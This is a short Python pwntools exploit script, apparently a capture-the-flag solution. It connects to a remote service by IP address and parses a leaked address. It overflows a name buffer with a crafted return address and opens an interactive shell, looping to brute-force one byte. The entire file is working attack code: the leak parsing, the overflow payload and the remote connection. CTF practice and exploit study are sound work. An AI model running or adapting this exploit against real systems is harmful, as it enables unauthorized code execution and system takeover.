#-*- encoding: utf-8 -*- 
from pwn import *
context.binary = './pwn'
#context.log_level = 'debug'
context.timeout = None
elf = context.binary

def dbg():
	raw_input()

def exploit():
	#爆破一个byte
	p.recvuntil('the ')
	leak = int(p.recvuntil(' ').strip(' '), 10)
	print 'addr ==> ' + hex((leak << 16)+0x8c0)
	#gdb.attach(p, 'b puts')
	#dbg()

	p.recvuntil('name?\n')
	name = 'a'*0xc
	name += p32((leak << 16)+0x69cd)
	p.send(name)

	p.recvuntil('byebye):\n')
	p.send('3')

	p.interactive()


if __name__ == '__main__':

	while 1:
		try:
			#p = process('./pwn')
			p = remote('101.71.29.5', 10000)
			#libc = context.binary.libc
			exploit()
		except Exception as e:
			p.close()